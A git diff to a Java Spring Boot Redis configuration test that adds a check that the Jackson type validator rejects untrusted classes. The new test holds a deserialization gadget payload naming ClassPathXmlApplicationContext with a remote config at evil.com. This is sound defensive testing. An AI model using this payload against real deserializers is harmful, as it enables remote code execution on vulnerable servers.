@@ -2,7 +2,9 @@ package com.comic.h.common.config;
 
 import static org.junit.jupiter.api.Assertions.assertEquals;
 import static org.junit.jupiter.api.Assertions.assertNotNull;
+import static org.junit.jupiter.api.Assertions.assertThrows;
 
+import java.nio.charset.StandardCharsets;
 import java.time.LocalDateTime;
 import java.util.List;
 
@@ -10,6 +12,8 @@ import org.junit.jupiter.api.Test;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.boot.test.context.SpringBootTest;
 import org.springframework.data.redis.core.RedisTemplate;
+import org.springframework.data.redis.serializer.RedisSerializer;
+import org.springframework.data.redis.serializer.SerializationException;
 
 import com.comic.h.comic.dto.response.ComicResponse;
 import com.comic.h.comic.dto.response.GenreResponse;
@@ -24,7 +28,8 @@ class RedisConfigTest {
 
     @Test
     void testRedisSerializationWithLocalDateTimeAndGenericPage() {
-        String testKey = "test:comic:1";
+        RedisSerializer<Object> serializer = (RedisSerializer<Object>) redisTemplate.getValueSerializer();
+        assertNotNull(serializer, "Serializer must not be null");
 
         ComicResponse comic = ComicResponse.builder()
                 .id(1L)
@@ -46,11 +51,12 @@ class RedisConfigTest {
                 .totalPages(1)
                 .build();
 
-        // 1. Lưu vào Redis
-        redisTemplate.opsForValue().set(testKey, pageResponse);
+        // 1. Serialize bằng serializer của RedisTemplate
+        byte[] serializedBytes = serializer.serialize(pageResponse);
+        assertNotNull(serializedBytes);
 
-        // 2. Đọc lại từ Redis
-        Object cachedObj = redisTemplate.opsForValue().get(testKey);
+        // 2. Deserialize lại
+        Object cachedObj = serializer.deserialize(serializedBytes);
         assertNotNull(cachedObj);
 
         // 3. Ép kiểu và kiểm chứng không bị lỗi ClassCastException hoặc crash LocalDateTime
@@ -62,8 +68,18 @@ class RedisConfigTest {
         ComicResponse cachedComic = retrieved.getContent().get(0);
         assertEquals("Đấu Phá Thương Khung", cachedComic.getTitle());
         assertNotNull(cachedComic.getCreatedAt());
+    }
 
-        // Dọn dẹp key test
-        redisTemplate.delete(testKey);
+    @Test
+    void testSecurityPolymorphicTypeValidatorBlocksUntrustedClasses() {
+        RedisSerializer<Object> serializer = (RedisSerializer<Object>) redisTemplate.getValueSerializer();
+        assertNotNull(serializer);
+
+        // Payload chứa class độc hại ngoài whitelist (giả lập gadget class)
+        String maliciousPayload = "{\"@class\":\"org.springframework.context.support.ClassPathXmlApplicationContext\",\"configLocation\":\"http://evil.com/exp.xml\"}";
+        byte[] maliciousBytes = maliciousPayload.getBytes(StandardCharsets.UTF_8);
+
+        // Xác minh Jackson 3 ném SerializationException vì bị BasicPolymorphicTypeValidator chặn
+        assertThrows(SerializationException.class, () -> serializer.deserialize(maliciousBytes));
     }
 }
